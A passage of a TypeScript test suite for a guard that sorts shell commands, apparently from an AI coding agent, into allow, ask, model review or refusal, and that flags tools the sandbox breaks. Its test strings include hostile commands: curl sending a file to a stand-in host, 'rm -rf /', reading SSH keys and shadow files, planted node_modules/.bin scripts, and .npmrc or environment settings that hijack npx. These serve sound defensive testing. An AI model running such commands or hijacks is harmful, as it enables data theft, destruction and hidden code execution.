    "sed -i \"$s\" g",
    "grep -f \"$x\" src/a.ts",
    "grep -e \"$p\" \"$f\"",
    "sed -f \"$x\" g",
    "rg --pre \"$x\" foo src",
    "name=--pre=id; rg -n \"$name\" src",
    "b='uno/e;#'; a=one; sed -i \"s/$a/$b/\" g",
    "name=foo; grep -rn $name src",
    "name=foo; read -r name < f; rg \"$name\" src",
    "for name in a b; do rg \"$name\" src; done",
  ]);
});

describe("r4 28: npx of a program the project has, or told not to install, goes to the model (it was judged as pnpm exec until the third pass)", () => {
  // The fixture has node_modules/.bin/tsc (a file), `linked` (a link to a file in the project)
  // and `outside` (a link to /usr/bin/id); it has no eslint.
  // Third pass (the maintainer's decision): none of these is a rule allow any more; each goes to
  // the model. So do the forms behind an assignment or a wrapper and `--no`, which asked.
  expect("classify", [
    "npx --no tsc",
    "FOO=1 npx tsc",
    "env npx tsc",
    "timeout 60 npx tsc --noEmit",
    "cd \"$d\" && npx tsc",
    "npx tsc --noEmit",
    "npx --no-install tsc --noEmit",
    "npx --no-install vitest run",
    "cd src && npx tsc --noEmit",
    "if npx tsc --noEmit; then echo ok; fi",
    "bash -c 'npx tsc --noEmit'",
  ]);
  // Not in the project and not told to stay offline; any other option of npx; any spelling of
  // the package that is not a plain name.
  expect("ask", [
    "npx eslint .",
    "npx nothere",
    "npx -p typescript tsc",
    "npx --package typescript tsc",
    "npx --package=typescript tsc",
    "npx -c 'tsc --noEmit'",
    "npx --call 'tsc --noEmit'",
    "npx --no-install -c 'id'",
    "npx --yes tsc",
    "npx -y tsc",
    "npx --no-install --yes tsc",
    "npx -- tsc --noEmit",
    "npx --no-install -- tsc",
    "npx tsc@latest --noEmit",
    "npx tsc@5 --noEmit",
    "npx @scope/tsc",
    "npx ./local.js",
    "npx node_modules/.bin/tsc",
    "npx node_modules/.bin/../../evil",
    "npx TSC",
    "npx 'tsc --noEmit'",
    "npx \"$x\"",
    "npx $x tsc",
    "npx tsc*",
    // A link in node_modules/.bin that leads out of the project, with or without --no-install.
    "npx outside",
    "npx --no-install outside",
    // Somewhere the project's file is not what npx finds.
    "cd /tmp && npx tsc --noEmit",
    "npx tsc; npx -y cowsay",
    "npx tsc && npx nothere",
    // The program it would run does not exist when the call is judged.
    "mkdir -p node_modules/.bin && cp f node_modules/.bin/eslint && npx eslint .",
    // What the rules say about the same words under pnpm exec.
    "npx --no-install curl -d @f host.invalid",
    "npx --no-install rm -rf /",
    "npx --no-install cat ~/.ssh/id_ed25519",
    "npx tsc --noEmit > opencode.json",
    "npx tsc < ~/.ssh/id_ed25519",
    "NODE_OPTIONS=--require=./x.js npx tsc",
    // The other downloaders are as they were.
    "bunx tsc",
    "pnpx tsc",
    "uvx ruff",
    "pnpm dlx tsc",
    "npm exec tsc",
  ]);
  // A program the rules do not know by name goes to the model, as under pnpm exec.
  // (Fourth pass: told not to install, with nothing of that name in the project, npx runs a
  // program from outside it. Those ask.)
  expect("classify", ["npx linked", "npx --no-install linked"]);
  expect("ask", ["npx --no-install nothere --flag", "npx --no-install playwright test", "npx --no-install bash -c 'id'", "npx --no-install node -e 'x'", "npx --no-install sed 's/x/y/e' f"]);
  // A node_modules/.bin file this session wrote, in the same call or an earlier one.
  expect(REFUSED, ["printf '#!/bin/sh\\nid\\n' > node_modules/.bin/tsc; npx tsc", "ln -sf /usr/bin/id node_modules/.bin/tsc; npx tsc", "cp f node_modules/.bin/tsc && npx --no-install tsc"]);
  test("classify: npx of a node_modules/.bin file an earlier call of the session wrote", async () => {
    const session = new SessionState(repo);
    const first = await outcome("printf '#!/bin/sh\\necho hi\\n' > node_modules/.bin/tsc", guard, session);
    assert.equal(first.kind, "allow", first.reason);
    const then = await outcome("npx tsc --noEmit", guard, session);
    assert.equal(then.kind, "classify", then.reason);
  });
});

describe("r4 12: tools the sandbox cannot serve ask while it is on, and the signing check reads the repository the command names", () => {
  // `sandboxBreaks` is asked only while the sandbox is on (index.ts): with `sandbox: false` the
  // decision alone holds, and these stay what the rules make of them.
  const broken = async (command: string) => {
    const session = new SessionState(repo);
    const d = await decideShell(guard, session, repo, command);
    return { decision: d, broken: d.printed === undefined ? undefined : sandboxBreaks(d.printed, repo, session) };
  };
  for (const [command, tool] of [
    ["gh pr view 123", "gh"],
    ["gh pr list", "gh"],
    ["gh run view", "gh"],
    ["gh api repos/o/r/pulls", "gh"],
    ["docker ps", "docker"],
    ["docker logs x", "docker"],
    ["docker compose ps", "docker"],
    ["systemctl status x", "systemctl"],
    ["systemctl --user status x", "systemctl"],
    ["loginctl", "loginctl"],
    ["loginctl list-sessions", "loginctl"],
    ["busctl list", "busctl"],
    // Behind a wrapper, in a chain, in a pipeline, in a nested shell.
    ["timeout 20 gh pr view 123", "gh"],
    ["env GH_PAGER=cat gh pr list", "gh"],
    ["ls && docker ps", "docker"],
    ["docker ps | head -3", "docker"],
    ["bash -c 'gh pr list'", "gh"],
    ["/usr/bin/docker ps", "docker"],
  ] as [string, string][]) {
    test(`asks while the sandbox is on: ${JSON.stringify(command)}`, async () => {
      const got = await broken(command);
      assert.ok(got.broken, `${command}: nothing was said (decision ${got.decision.effect} by ${got.decision.by})`);
      assert.match(got.broken, new RegExp(`^${tool} `), got.broken);
      assert.match(got.broken, /an approved run happens outside the sandbox/);
    });
  }
  // A name is a tool only where a program stands; asking for the version or the help needs
  // nothing the sandbox hides.
  for (const command of ["echo gh pr list", "rg docker src", "grep -rn systemctl src", "ls gh docker", "cat f | grep loginctl", "gh --version", "docker --version", "systemctl --version", "gh --help", "docker --help", "git log --grep docker"]) {
    test(`says nothing about ${JSON.stringify(command)}`, async () => assert.equal((await broken(command)).broken, undefined));
  }
  test("with the sandbox off the decision is what it was: gh pr view and docker ps are rule allows", async () => {
    for (const c of ["gh pr view 123", "gh pr list", "docker ps", "docker logs x"]) {
      const d = await decideShell(guard, new SessionState(repo), repo, c);
      assert.equal(`${d.effect} by ${d.by}`, "allow by rules", c);
    }
  });

  // The fixture's `child` is a repository of its own inside the project.
  const child = () => path.join(repo, "child");
  const withConfig = (dir: string, key: string, value: string, run: () => void) => {
    git(dir, "config", key, value);
    try {
      run();
    } finally {
      git(dir, "config", "--unset", key);
    }
  };
  const breaks = (command: string) => {
    const p = canonical(command);
    assert.ok(!("ask" in p), command);
    return sandboxBreaks((p as { text: string }).text, repo, new SessionState(repo));
  };
  test("git -C child commit asks when child signs commits, and the project's own commit does not", () => {
    withConfig(child(), "commit.gpgsign", "true", () => {
      assert.match(breaks("git -C child commit -m x") ?? "", /signs commits/);
      assert.match(breaks("cd child && git commit -m x") ?? "", /signs commits/);
      assert.match(breaks("cd child\ngit commit -m x") ?? "", /signs commits/);
      assert.match(breaks("git -C ./child commit -m x") ?? "", /signs commits/);
      assert.match(breaks(`git -C ${child()} commit -m x`) ?? "", /signs commits/);
      assert.match(breaks("git commit -m x && git -C child commit -m y") ?? "", /signs commits/);
      assert.match(breaks("git -C child rebase main") ?? "", /signs commits/);
      assert.equal(breaks("git commit -m x"), undefined);
      assert.equal(breaks("git -C . commit -m x"), undefined);
      assert.equal(breaks("git -C child status"), undefined);
    });
  });
  test("a project that signs asks for its own commit, and not for a commit in a child that does not sign", () => {
    git(child(), "config", "commit.gpgsign", "false");
    try {
      withConfig(repo, "commit.gpgsign", "true", () => {
        assert.match(breaks("git commit -m x") ?? "", /signs commits/);
        assert.match(breaks("git -C . commit -m x") ?? "", /signs commits/);
        assert.equal(breaks("git -C child commit -m x"), undefined);
        assert.equal(breaks("cd child && git commit -m x"), undefined);
      });
    } finally {
      git(child(), "config", "--unset", "commit.gpgsign");
    }
  });
  test("tags, pushes and verified merges are read in the repository the command names too", () => {
    withConfig(child(), "tag.gpgsign", "true", () => {
      assert.match(breaks("git -C child tag v9") ?? "", /git signs here/);
      assert.equal(breaks("git tag v9"), undefined);
    });
    withConfig(child(), "merge.verifysignatures", "true", () => {
      assert.match(breaks("git -C child merge topic") ?? "", /checks signatures/);
      assert.equal(breaks("git merge topic"), undefined);
    });
    withConfig(child(), "push.gpgsign", "true", () => {
      assert.match(breaks("git -C child push origin main") ?? "", /git signs here/);
    });
  });
  test("a repository the check cannot read asks", () => {
    assert.match(breaks("git -C nowhere commit -m x") ?? "", /signs commits/);
  });
  // Second pass: signing switched on (or off) by a `-c` of the call itself. git reads the
  // command line after the repository's config, so the check asks git with the same words.
  test("signing given with -c on the command line is read, in the repository the call names", async () => {
    assert.match(breaks("git -c commit.gpgsign=true commit -m x") ?? "", /signs commits/);
    assert.match(breaks("git -C child -c commit.gpgsign=true commit -m x") ?? "", /signs commits/);
    // (Another spelling of the key is no key the guards let through: it asks before this check.)
    assert.equal((await outcome("git -c commit.gpgSign=true commit -m x")).kind, "ask");
    assert.match(breaks("git -c commit.gpgsign=yes commit -m x") ?? "", /signs commits/);
    assert.match(breaks("git -c user.name=x -c commit.gpgsign=true commit -m x") ?? "", /signs commits/);
    assert.match(breaks("git -c commit.gpgsign=true rebase main") ?? "", /signs commits/);
    assert.match(breaks("git add -A && git -c commit.gpgsign=true commit -m x") ?? "", /signs commits/);
    // A value git cannot read as a boolean asks too (git itself fails on it).
    assert.match(breaks("git -c commit.gpgsign=maybe commit -m x") ?? "", /signs commits/);
    // Only the call that carries the option.
    assert.equal(breaks("git -c commit.gpgsign=true status && git commit -m x"), undefined);
    assert.equal(breaks("git -c commit.gpgsign=false commit -m x"), undefined);
    assert.equal(breaks("git -c user.name=x commit -m x"), undefined);
    const whole = await outcome("git -c commit.gpgsign=true commit -m x");
    assert.equal(whole.kind, "breaks", whole.reason);
    assert.match(whole.reason, /signs commits/);
    assert.equal((await outcome("git -C child -c commit.gpgsign=true commit -m x")).kind, "breaks");
  });
  test("a -c of the call that switches signing off is what git does, over the repository's config", () => {
    withConfig(child(), "commit.gpgsign", "true", () => {
      assert.match(breaks("git -C child commit -m x") ?? "", /signs commits/);
      assert.equal(breaks("git -C child -c commit.gpgsign=false commit -m x"), undefined);
      assert.match(breaks("git -C child -c commit.gpgsign=false -c commit.gpgsign=true commit -m x") ?? "", /signs commits/);
    });
  });
});

// ---- second pass: what three cross-checks of group D found ----

const STAND_IN = "#!/bin/sh\necho ran\n";
// A project of its own under the test's home: the files given, stand-ins in node_modules/.bin,
// committed (node_modules ignored).
const project = (name: string, files: Record<string, string>, bins = ["tsc"]) => {
  const dir = path.join(base, name);
  fs.mkdirSync(dir, { recursive: true });
  for (const [f, text] of Object.entries(files)) write(path.join(dir, f), text);
  for (const b of bins) write(path.join(dir, "node_modules", ".bin", b), STAND_IN, 0o755);
  write(path.join(dir, ".gitignore"), "node_modules/\n");
  git(base, "init", "-q", "-b", "main", dir);
  git(dir, "add", "-A");
  git(dir, "commit", "-qm", "init");
  return dir;
};
const PKG = (extra: object = {}) => `${JSON.stringify({ name: "fixture", version: "1.0.0", private: true, ...extra }, null, 2)}\n`;
async function outcomeIn(dir: string, command: string, session = new SessionState(dir)): Promise<{ kind: Want | "deny"; reason: string }> {
  const d = await decideShell(guard, session, dir, command);
  if (d.by === "no-model") return { kind: "classify", reason: d.reason };
  if (d.effect !== "allow") return { kind: d.effect === "ask" ? "ask" : "deny", reason: d.reason };
  const broken = d.printed === undefined ? "no printed text" : sandboxBreaks(d.printed, dir, session);
  return broken ? { kind: "breaks", reason: broken } : { kind: "allow", reason: "" };
}

describe("r4 28, second pass (1): an npx of a program the project has goes to the model, whatever the session wrote", () => {
  let dir = "";
  before(() => {
    dir = project("npm-session", { "package.json": PKG({ devDependencies: { typescript: "5.9.3" } }), "src/a.ts": "export const a = 1;\n", "a.tar": "" }, ["tsc", "jest", "vitest", "eslint"]);
  });
  // Third pass: these went to the model because the session had written a file, and were rule
  // allows in a session that had written nothing. Now both go to the model, with the reading's
  // one reason (which no longer names a file: "third pass (5)" below holds that it is the same).
  // One line: the write and the npx in the same call.
  // (A call that writes the project's .npmrc beside the npx: npm reads the new file, the reading
  // read the old one. The fourth pass asked about it. Fifth pass, the maintainer's rule: LEFT TO
  // THE MODEL ON PURPOSE, as before the fourth pass. Only a part of the call that spells
  // node_modules asks; the model is shown the whole call.)
  for (const command of [
    "printf 'x' > pre.js && printf 'node-options=--require ./pre.js\\n' > .npmrc && npx tsc",
    "printf '#!/bin/sh\\nx\\n' > evilsh && chmod +x evilsh && printf 'script-shell=./evilsh\\n' > .npmrc && npx tsc",
    "printf 'package=evil-pkg\\n' > .npmrc && npx tsc",
  ]) {
    test(`classify: ${JSON.stringify(command)}`, async () => {
      const got = await outcomeIn(dir, command);
      assert.equal(got.kind, "classify", got.reason);
      assert.match(got.reason, /\(npx tsc: the project has node_modules\/\.bin\/tsc/);
    });
  }
  for (const command of [
    "printf 'x' > notes.txt && npx tsc --noEmit",
    "printf 'x' > notes.txt; cd src && npx tsc",
    "npx tsc --noEmit && printf 'x' > notes.txt",
    "npx tsc --noEmit > out.txt",
    "npx tsc --noEmit | tee out.txt",
    "npx tsc --noEmit > /dev/null; printf 'x' > notes.txt",
    "printf 'x' > notes.txt && npx --no-install tsc",
    "printf 'x' > jest.config.js && npx --no-install jest",
    "printf 'x' > vitest.config.js && npx vitest run",
    "printf 'x' > .eslintrc.js && npx eslint .",
  ]) {
    test(`classify: ${JSON.stringify(command)}`, async () => {
      const got = await outcomeIn(dir, command);
      assert.equal(got.kind, "classify", got.reason);
      assert.match(got.reason, /npx (tsc|jest|vitest|eslint): the project has/);
    });
  }
  // Two calls of one session: the first is a rule allow (asserted, not assumed), the second
  // goes to the model.
  for (const [first, second] of [
    ["printf 'node-options=--require ./pre.js\\n' > .npmrc", "npx tsc"],
    ["printf 'x' > jest.config.js", "npx --no-install jest"],
    ["printf 'x' > notes.txt", "npx tsc --noEmit"],
    ["printf 'x' > notes.txt", "cd src && npx tsc"],
    ["printf 'x' > src/b.ts", "npx --no-install vitest run"],
    // A write the check cannot list (an archive unpacked).
    ["tar -xf a.tar", "npx tsc --noEmit"],
  ]) {
    test(`classify, in a session that ran ${JSON.stringify(first)}: ${JSON.stringify(second)}`, async () => {
      const session = new SessionState(dir);
      const one = await outcomeIn(dir, first, session);
      assert.equal(one.kind, "allow", one.reason);
      const two = await outcomeIn(dir, second, session);
      assert.equal(two.kind, "classify", two.reason);
      assert.match(two.reason, /npx (tsc|jest|vitest): the project has/);
    });
  }
  // A session that wrote nothing (third pass: these were rule allows): the model, also after
  // calls that only read, which stay rule allows themselves.
  test("classify: npx in a session that wrote nothing", async () => {
    for (const c of ["npx tsc --noEmit", "npx --no-install vitest run", "cd src && npx tsc", "npx --no-install tsc --noEmit", "npx eslint .", "npx tsc --noEmit > /dev/null 2>&1", "npx tsc --noEmit 2>&1 | tail -20", "npx tsc 2>/dev/null; npx eslint . >/dev/null"]) {
      const got = await outcomeIn(dir, c);
      assert.equal(got.kind, "classify", `${c}: ${got.reason}`);
    }
    const session = new SessionState(dir);
    for (const c of ["ls", "git status", "cat package.json"]) assert.equal((await outcomeIn(dir, c, session)).kind, "allow", c);
    for (const c of ["npx tsc --noEmit", "cd src && npx tsc", "npx --no-install vitest run"]) assert.equal((await outcomeIn(dir, c, session)).kind, "classify", c);
  });
});

describe("r4 28, second pass (2): a qualifying npx runs in a directory inside the project", () => {
  let inner = "";
  before(() => {
    // `outer` is no project and holds a node_modules/.bin/tsc; `inner` is the project, below it,
    // with no node_modules of its own: npm's walk for the file ends in `outer`.
    write(path.join(base, "outer", "node_modules", ".bin", "tsc"), STAND_IN, 0o755);
    inner = project("outer/inner", { "src/a.ts": "export const a = 1;\n" }, []);
  });
  expect("ask", [
    "cd .. && npx --no-install tsc",
    "cd / && npx --no-install tsc",
    "cd ~ && npx --no-install tsc",
    "cd /tmp && npx --no-install tsc",
    "cd /usr && npx --no-install tsc",
    "cd .. && npx tsc",
    "mkdir -p /tmp/node_modules/.bin && printf '#!/bin/sh\\nx\\n' > /tmp/node_modules/.bin/tsc && chmod +x /tmp/node_modules/.bin/tsc && cd /tmp && npx --no-install tsc",
    "(cd .. && npx --no-install tsc)",
  ]);
  test("the reason says where: outside the project", async () => {
    for (const c of ["cd .. && npx --no-install tsc", "cd / && npx --no-install tsc", "cd ~ && npx --no-install tsc"]) assert.match((await outcome(c)).reason, /npx outside the project \(in \//, c);
  });
  // The project has no package.json and no node_modules: npm takes the nearest directory above
  // that has one for its prefix, reads that directory's .npmrc and runs its .bin file.
  test("ask: the directory npm starts from is above the project", async () => {
    for (const c of ["npx --no-install tsc", "npx tsc", "cd src && npx --no-install tsc"]) {
      const got = await outcomeIn(inner, c);
      assert.equal(got.kind, "ask", `${c}: ${got.reason}`);
      assert.match(got.reason, /outside the project/);
    }
  });
});

describe("r4 28, second pass (3): the package's own bin, its workspaces and the project's .npmrc are read as npm reads them", () => {
  const made = new Map<string, string>();
  const at = (name: string) => made.get(name)!;
  before(() => {
    const put = (name: string, files: Record<string, string>) => made.set(name, project(`npm-${name}`, files));
    put("bin-object", { "package.json": PKG({ bin: { tsc: "x.js" } }), "x.js": "" });
    put("bin-string", { "package.json": PKG({ name: "tsc", bin: "x.js" }), "x.js": "" });
    put("bin-scoped", { "package.json": PKG({ name: "@acme/tsc", bin: "x.js" }), "x.js": "" });
    put("bin-array", { "package.json": PKG({ bin: ["cli/tsc"] }), "cli/tsc": "" });
    put("bin-path-key", { "package.json": PKG({ bin: { "some/tsc": "x.js" } }), "x.js": "" });
    put("bin-dir", { "package.json": PKG({ directories: { bin: "cli" } }), "cli/tsc": "" });
    put("bin-odd", { "package.json": PKG({ bin: 7 }) });
    put("broken", { "package.json": "{ not json\n" });
    put("bin-other", { "package.json": PKG({ bin: { fixture: "x.js", "tsc-watch": "y.js" } }), "x.js": "" });
    put("bin-other-string", { "package.json": PKG({ bin: "x.js" }), "x.js": "" });
    put("no-package", { "src/a.ts": "" });
    // A workspace root with two packages; `a` has a bin named tsc.
    put("ws", { "package.json": PKG({ workspaces: ["packages/*"] }), "packages/a/package.json": PKG({ name: "a", bin: { tsc: "x.js" } }), "packages/b/package.json": PKG({ name: "b" }) });
    // A workspace root whose own bin is named tsc.
    put("ws-root-bin", { "package.json": PKG({ workspaces: ["packages/*"], bin: { tsc: "x.js" } }), "packages/b/package.json": PKG({ name: "b" }) });
    // No workspaces: a package below another. npm's prefix is the nearer one, and the upper
    // one's bin is not looked at (its node_modules/.bin is).
    put("nested", { "package.json": PKG({ bin: { tsc: "x.js" } }), "sub/package.json": PKG({ name: "sub" }) });
    put("rc", { "package.json": PKG(), "src/a.ts": "" });
  });
  for (const name of ["bin-object", "bin-string", "bin-scoped", "bin-array", "bin-path-key", "bin-dir", "bin-odd", "broken"]) {
    test(`ask: npx tsc where package.json is ${name}`, async () => {
      for (const c of ["npx tsc --noEmit", "npx --no-install tsc --noEmit"]) {
        const got = await outcomeIn(at(name), c);
        assert.equal(got.kind, "ask", `${c}: ${got.reason}`);
        assert.match(got.reason, /package\.json/);
      }
    });
  }
  for (const name of ["bin-other", "bin-other-string", "no-package"]) {
    test(`classify (third pass: no npx is a rule allow): npx tsc where package.json is ${name}`, async () => {
      for (const c of ["npx tsc --noEmit", "npx --no-install tsc --noEmit"]) {
        const got = await outcomeIn(at(name), c);
        assert.equal(got.kind, "classify", `${c}: ${got.reason}`);
      }
    });
  }
  test("workspaces: the bin of the package npm starts in and of the workspace root above it", async () => {
    const kind = async (name: string, c: string) => (await outcomeIn(at(name), c)).kind;
    assert.equal(await kind("ws", "cd packages/a && npx tsc"), "ask");
    assert.match((await outcomeIn(at("ws"), "cd packages/a && npx tsc")).reason, /packages\/a\/package\.json.*bin named tsc/);
    assert.equal(await kind("ws", "cd packages/b && npx tsc"), "classify");
    assert.equal(await kind("ws", "npx tsc"), "classify");
    assert.equal(await kind("ws-root-bin", "cd packages/b && npx tsc"), "ask");
    assert.equal(await kind("ws-root-bin", "npx tsc"), "ask");
    assert.equal(await kind("nested", "cd sub && npx tsc"), "classify");
    assert.equal(await kind("nested", "npx tsc"), "ask");
  });
  // The .npmrc of the directory npm takes for its prefix: only settings known to change
  // nothing about what runs or where npm looks pass.
  const withFile = async (file: string, text: string, run: () => Promise<void>) => {
    write(file, text);
    try {
      await run();
    } finally {
      fs.rmSync(file);
    }
  };
  for (const [text, key] of [
    ["script-shell=./evilsh\n", "script-shell"],
    ["node-options=--require ./pre.js\n", "node-options"],
    ["package=evil-pkg\n", "package"],
    ["package[]=evil-pkg\n", "package"],
    ["call=id\n", "call"],
    ["workspaces=true\n", "workspaces"],
    ["workspace=packages/a\n", "workspace"],
    ["prefix=./x\n", "prefix"],
    ["global=true\n", "global"],
    ["location=global\n", "location"],
    ["userconfig=./rc\n", "userconfig"],
    ["globalconfig=./rc\n", "globalconfig"],
    ["yes=true\n", "yes"],
    ["save-exact=true\nscript-shell = ./evilsh\n", "script-shell"],
    ["  script-shell  =  ./evilsh\n", "script-shell"],
    ["\"script-shell\"=./evilsh\n", "script-shell"],
    ["frobnicate=1\n", "frobnicate"],
    ["[section]\nx=1\n", "section"],
  ] as [string, string][]) {
    test(`ask: npx tsc with a project .npmrc ${JSON.stringify(text)}`, async () => {
      await withFile(path.join(at("rc"), ".npmrc"), text, async () => {
        for (const c of ["npx tsc --noEmit", "npx --no-install tsc", "cd src && npx tsc"]) {
          const got = await outcomeIn(at("rc"), c);
          assert.equal(got.kind, "ask", `${c}: ${got.reason}`);
          assert.match(got.reason, /\.npmrc/);
          assert.ok(got.reason.includes(key), got.reason);
        }
      });
    });
  }
  test("classify (third pass: no npx is a rule allow): npx tsc with a project .npmrc of registry, login and install settings", async () => {
    const text = "registry=https://registry.npmjs.org/\n@acme:registry=https://npm.example.invalid/\n//npm.example.invalid/:_authToken=${NPM_TOKEN}\nsave-exact=true\n; a comment\n# another\n\nengine-strict = true\nlegacy-peer-deps=true\nfund=false\naudit=false\n";
    await withFile(path.join(at("rc"), ".npmrc"), text, async () => {
      for (const c of ["npx tsc --noEmit", "npx --no-install tsc", "cd src && npx tsc"]) assert.equal((await outcomeIn(at("rc"), c)).kind, "classify", c);
    });
    assert.equal((await outcomeIn(at("rc"), "npx tsc --noEmit")).kind, "classify");
  });
  test("the user's own .npmrc and npm_config_ variables: a setting that moves what npm runs asks", async () => {
    const user = path.join(os.homedir(), ".npmrc");
    await withFile(user, "script-shell=/bin/bash\n", async () => {
      const got = await outcomeIn(at("rc"), "npx tsc --noEmit");
      assert.equal(got.kind, "ask", got.reason);
      assert.match(got.reason, /script-shell/);
    });
    await withFile(user, "package=evil-pkg\n", async () => assert.equal((await outcomeIn(at("rc"), "npx tsc --noEmit")).kind, "ask"));
    // What a user's file usually holds.
    await withFile(user, "prefix=${HOME}/.npm-global\n//registry.npmjs.org/:_authToken=x\ninit-author-name=me\ncache=/var/cache/npm\n", async () => assert.equal((await outcomeIn(at("rc"), "npx tsc --noEmit")).kind, "classify"));
    for (const [name, value, want] of [
      ["npm_config_script_shell", "/bin/bash", "ask"],
      ["NPM_CONFIG_PACKAGE", "evil-pkg", "ask"],
      ["npm_config_node_options", "--require ./pre.js", "ask"],
      ["npm_config_workspaces", "true", "ask"],
      ["npm_config_global", "true", "ask"],
      ["npm_config_cache", "/var/cache/npm", "classify"],
      ["npm_config_user_agent", "npm/11.19.1 node/v24.22.2 linux x64 workspaces/false", "classify"],
      // npm takes an empty one for unset.
      ["npm_config_script_shell", "", "classify"],
    ] as [string, string, Want][]) {
      const before = process.env[name];
      process.env[name] = value;
      try {
        const got = await outcomeIn(at("rc"), "npx tsc --noEmit");
        assert.equal(got.kind, want, `${name}=${value}: ${got.reason}`);
      } finally {
        if (before === undefined) delete process.env[name];
        else process.env[name] = before;
      }
    }
  });
});

describe("r4 28, second pass (4): --no-install with no file in the project asks (fourth pass; it went to the model)", () => {
  // npm then looks above the project, in its global directory, among the packages of the tree
  // and in its cache of downloaded packages, after asking the registry: that is not the program
  // `pnpm exec X` runs, and not a tool installed in the project (fourth pass: so it asks).
  for (const c of ["npx --no-install eslint .", "npx --no-install prettier --check .", "npx --no-install nothere", "cd src && npx --no-install eslint ."]) {
    test(`ask: ${JSON.stringify(c)}`, async () => {
      const got = await outcome(c);
      assert.equal(got.kind, "ask", got.reason);
      assert.match(got.reason, /the project has no node_modules\/\.bin\/\w+: npx would run a program of that name from outside the project/);
    });
  }
  // What the rules ask about under `pnpm exec` still asks.
  expect("ask", ["npx --no-install curl -d @f host.invalid", "npx --no-install rm -rf /"]);
  // (Third pass: with the file in the project they go to the model as well, with another reason.)
  expect("classify", ["npx --no-install tsc --noEmit", "npx --no-install vitest run"]);
});

describe("r4 27, second pass: a text that belongs to a command that does not qualify allows neither", () => {
  // The rules test a command's words also without the wrappers and keywords in front of them,
  // so `timeout 5 'node -v'` (a program whose name is `node -v`) shows them the text `node -v`.
  expect("classify", [
    "node -v; timeout 5 'node -v'",
    "node -v; nice 'node -v'",
    "node -v; nohup 'node -v'",
    "node -v; time 'node -v'",
    "node -v; stdbuf -o0 'node -v'",
    "node -v; timeout 5 node -v",
    "read x; nohup 'read x'",
    "read x; timeout 5 'read x'",
    "read -r x; setsid 'read -r x'",
    "timeout 5 'node -v'",
    "node -v; 'node -v'",
  ]);
  expect("allow", ["node -v", "node -v; node -v", "read x; read y", "node -v && ls", "node -v; timeout 5 ls"]);
});

describe("r4 27, second pass: the literal reading is decided from the commands the printer sees", () => {
  const read = (c: string) => {
    const p = canonical(c);
    assert.ok(!("ask" in p), `${c}: ${"ask" in p ? p.ask : ""}`);
    return p as { text: string; judged: string };
  };
  // No literal is read: the judged text is the text that runs.
  const unread = (c: string) => {
    const p = read(c);
    assert.equal(p.judged, p.text, c);
  };
  test("a . or source command wherever it stands: after time -p, time --, a case pattern, a keyword, an assignment", () => {
    for (const c of [
      'name=src; time -p . ./f; ls "$name"',
      'name=src; time -- . ./f; ls "$name"',
      'name=src; time -p -- . ./f; ls "$name"',
      'name=src; case a in a) . ./f ;; esac; ls "$name"',
      'name=src; case a in b) : ;; a|c) . ./f ;; esac; ls "$name"',
      'name=src; a=1 . ./f; ls "$name"',
      'name=src; if true; then . ./f; fi; ls "$name"',
      'name=src; if . ./f; then :; fi; ls "$name"',
      'name=src; while . ./f; do break; done; ls "$name"',
      'name=src; for i in 1; do . ./f; done; ls "$name"',
      'name=src; ! . ./f; ls "$name"',
      'name=src; { . ./f; }; ls "$name"',
      'name=src; true && . ./f; ls "$name"',
      'name=src; true | . ./f; ls "$name"',
      'name=src; "." ./f; ls "$name"',
      "name=src; \\. ./f; ls \"$name\"",
      'name=src; . ./f; ls "$name"',
      'name=src; : "$(. ./f)"; ls "$name"',
      'name=src; source ./f; ls "$name"',
      // A command whose name is not written out could be any builtin.
      'name=src; $x ./f; ls "$name"',
      'name=src; "$x" ./f; ls "$name"',
      'name=src; $(echo .) ./f; ls "$name"',
    ]) unread(c);
  });
  test("a dot that is an argument, a path or part of a word is no command", () => {
    assert.equal(read('name=src; ls . "$name"').judged, "name=src ; ls . src");
    assert.equal(read('name=src; grep -rn "$name" .').judged, "name=src ; grep -rn src .");
    assert.equal(read('name=src; ./run.sh "$name"').judged, "name=src ; ./run.sh src");
    assert.equal(read('name=src; echo a; ls "$name"').judged, "name=src ; echo a ; ls src");
    assert.equal(read('name=src; time -p ls "$name"').judged, "name=src ; time -p ls src");
  });
  test("a function bash imports from the environment can set a variable unseen: no literal is read", async () => {
    const c = 'x=src/; ls; cat "$x"etc/shadow';
    assert.equal(read(c).judged, "x=src/ ; ls ; cat src/etc/shadow");
    assert.equal((await outcome('name=foo; grep -rn "$name" src')).kind, "allow");
    process.env["BASH_FUNC_ls%%"] = "() { x=/; }";
    try {
      unread(c);
      unread('name=foo; grep -rn "$name" src');
      assert.equal((await outcome('name=foo; grep -rn "$name" src')).kind, "classify");
    } finally {
      delete process.env["BASH_FUNC_ls%%"];
    }
    assert.equal(read(c).judged, "x=src/ ; ls ; cat src/etc/shadow");
  });
  // The tests the reviews found missing: each fails when its line is taken out of canon.ts
  // (xcheck/d2/mutation/ holds the runs).
  test("braces and a literal in one call: the brace counter starts again for the second print", () => {
    // 2000 words of 30 characters: over half of what a command may hold, so counted twice it
    // would be refused.
    const c = `name=src; echo ${"a".repeat(25)}{1000..2999} "$name"`;
    const p = read(c);
    assert.ok(p.judged.endsWith(" src"), p.judged.slice(-40));
    assert.ok(p.text.endsWith(' "$name"'), p.text.slice(-40));
  });
  test("a call that defines a function reads no literal, whatever the function holds", () => {
    unread('name=src; f() { ls; }; f; ls "$name"');
    unread('name=src; function f { ls; }; ls "$name"');
  });
  test("the code of a nested shell reads no literal of its own", () => {
    const p = read("bash -c 'name=src; ls \"$name\"'");
    assert.ok(!p.judged.includes("ls src"), p.judged);
    assert.equal(p.judged, p.text);
    const q = read("name=src; bash -c 'name=src; ls \"$name\"'");
    assert.ok(!q.judged.includes("ls src"), q.judged);
  });
  test("histchars and auto_resume are never read as literals", () => {
    unread('histchars=abc; echo "$histchars"');
    unread('auto_resume=exact; echo "$auto_resume"');
    assert.equal(read('histchar=abc; echo "$histchar"').judged, "histchar=abc ; echo abc");
  });
  test("beside a ~ or a glob the literal stays quoted, as the expansion was", () => {
    assert.equal(read('name=root; ls ~"$name"').judged, "name=root ; ls ~'root'");
    assert.equal(read('name=src; ls *"$name"').judged, "name=src ; ls *'src'");
    assert.equal(read('name=src; ls "$name"/*.ts').judged, "name=src ; ls 'src'/*.ts");
    assert.equal(read('name=src; ls "${name}"?').judged, "name=src ; ls 'src'?");
  });
  // The second print is used only when its run text equals the first one's. No input reaches
  // the other branch (the literal goes into the judged text alone), so no test can fail on that
  // line; what can be held is that the text that runs never changes with the reading.
  test("the text that runs is the same with and without a literal reading", () => {
